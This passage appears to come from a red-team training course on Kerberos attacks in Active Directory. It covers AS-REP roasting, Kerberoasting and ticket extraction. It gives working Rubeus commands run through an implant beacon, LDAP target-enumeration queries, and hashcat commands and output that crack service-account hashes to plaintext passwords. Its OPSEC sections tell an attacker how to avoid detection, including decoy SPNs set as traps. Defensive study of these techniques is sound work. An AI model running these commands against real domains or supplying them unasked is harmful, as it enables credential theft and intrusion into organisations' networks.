
## AS-REP Roasting
AS-REP roasting is a technique [T1558.004](https://attack.mitre.org/techniques/T1558/004/) for obtaining the plaintext password of accounts that have Kerberos preauthentication disabled.  In these cases, an adversary can send AS-REQs without having to provide a valid encrypted timestamp and the KDC will respond with an AS-REP containing the TGT for the target account.  AS-REPs contain a logon session key which is encrypted with the principal's hash.  The adversary can extract this encrypted blob and to brute-force it offline to recover the accounts plaintext password.

Rubeus' `asreproast` command will enumerate every account that has preauthentication disabled, sends an AS-REQ for them, then carves out the encrypted part.

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /format:hashcat /nowrap

[*] Action: AS-REP roasting
[*] Target Domain          : contoso.com
[*] Searching path 'LDAP://lon-dc-1.contoso.com/DC=contoso,DC=com' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'

[*] SamAccountName         : oracle_svc
[*] DistinguishedName      : CN=Oracle Service,CN=Users,DC=contoso,DC=com
[*] Using domain controller: lon-dc-1.contoso.com (10.10.120.1)
[*] Building AS-REQ (w/o preauth) for: 'contoso.com\oracle_svc'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

$krb5asrep$23$oracle_svc@contoso.com:92D6F[...snip...]19124
```

>By default, Rubeus outputs hashes for John the Ripper.  Use `/format:hashcat` to output them for Hashcat instead.

These RC4 AS-REP's can be cracked using hashcat's 18200 mode.

```powershell
PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 18200 .\asrep.hash .\example.dict -r .\rules\dive.rule
$krb5asrep$23$oracle_svc@contoso.com:92d6f[...snip...]19124:Passw0rd!
```

#### *OPSEC Considerations*

Most detection strategies are geared towards looking at unusual or anomalous ticket requests.  Each AS-REP generates a 4768 event, so a single user sending multiple AS-REQs in a short timeframe should be investigated.  Rubeus also requests RC4-encrypted tickets by default because they are easier to crack.  However, since modern versions of Windows uses AES128 and 256, the use of RC4 tickets can stand out.

## Kerberoasting

Kerberoasting is a technique [[T1558.003](https://attack.mitre.org/techniques/T1558/003/)] for obtaining the plaintext password of the service account associated with an SPN.  An adversary can send TGS-REQs for one or more SPNs and get TGS-REPs in return.  These contain valid service tickets that are partially encrypted using the service's secret.  These encrypted parts can be carved out and brute-forced office to recover the service accounts plaintext password.

This attack isn't viable against services that run in the context of a computer account because these passwords are automatically set (128-characters long), and rotated by Active Directory every 30 days.  It relies on domain accounts that have been setup by humans, have weak passwords, and maybe even configured to never expire.

Rubeus' `kerberoast` command will enumerate and roast every non-default service.

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /format:hashcat /simple

[*] Total kerberoastable users : 1

$krb5tgs$23$*mssql_svc$contoso.com$MSSQLSvc/lon-sql-1.contoso.com:1433@contoso.com*$95505[...snip...]9A715
```

These hashes can be cracked using hashcat's 13100 hash mode.

```powershell
PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 13100 .\kerb.hash .\example.dict -r .\rules\dive.rule
$krb5tgs$23$*mssql_svc$contoso.com$MSSQLSvc/lon-sql-1.contoso.com:1433@contoso.com*$95505[...snip...]9a715:Passw0rd!
```

#### *OPSEC Considerations*

Each TGS-REP generates a 4769 event, so a single user requesting multiple tickets in a short timeframe should be investigated.  As with AS-REP Roasting, Rubeus requests service tickets using RC4 encryption by default.

> Another effective strategy is to create one or more dummy SPNs that are not backed by a legitimate service, in which case, a TGS-REQ/REP should never be generated for them.  Since most tools automatically enumerate and roast every account in a domain with an SPN set, a careless adversary can trigger this high-fidelity alert.

A safer approach is to use an enumeration tool to triage potential targets first, then roast them more selectively.

```powershell
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe -s "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))" --attributes cn,samaccountname,serviceprincipalname
            
[*] LDAP://DC=contoso,DC=com
[*] CUSTOM SEARCH: 
[*] TOTAL NUMBER OF SEARCH RESULTS: 1
	[+] cn                   : MSSQL Service
	[+] samaccountname       : mssql_svc
	[+] serviceprincipalname : MSSQLSvc/lon-sql-1.contoso.com:1433

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /spn:MSSQLSvc/lon-sql-1.contoso.com:1433 /simple /nowrap
```

## Extracting Tickets

If an adversary gains elevated access to a computer, they can extract Kerberos tickets that are currently cached in memory.  Rubeus' `triage` command will enumerate every logon session present and their associated tickets.  If multiple logon session exist (i.e. multiple users are logged onto the same computer), TGTs and/or service tickets for those users can be extracted and re-used by the adversary.